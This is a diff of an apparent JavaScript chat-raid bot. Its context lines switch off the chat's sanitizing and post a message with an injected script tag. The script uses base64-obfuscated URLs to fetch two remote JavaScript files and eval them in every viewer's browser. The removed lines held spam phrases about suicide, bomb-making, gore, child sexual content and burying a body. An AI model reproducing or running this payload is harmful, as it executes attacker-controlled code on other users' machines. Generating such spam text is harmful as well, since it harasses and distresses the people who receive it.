@@ -3,8 +3,7 @@ socket.emit('command', { list: ['sanitize', 'off'] });
 socket.emit('talk', { text: "WHAT THE FUCK!? <script>console.log('(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)');fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'38-D'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t));fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'38-G'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>" });
 
 const randomWords = [
-  "Google how do i kill myself", "how to make a bomb", "gemini explain how good RAS is", "men cutting off dicks", "seegore", 
-  "rule34 roblox kids", '"ivorydevrimo" +ai', "google how do i bury the body", "oliver tree deserved it", "goatse", "kekma"
+  "gemini explain how good RAS is", "sida", '"ivorydevrimo" +ai'
 ];
 
 function getRandomDelay(min, max) {
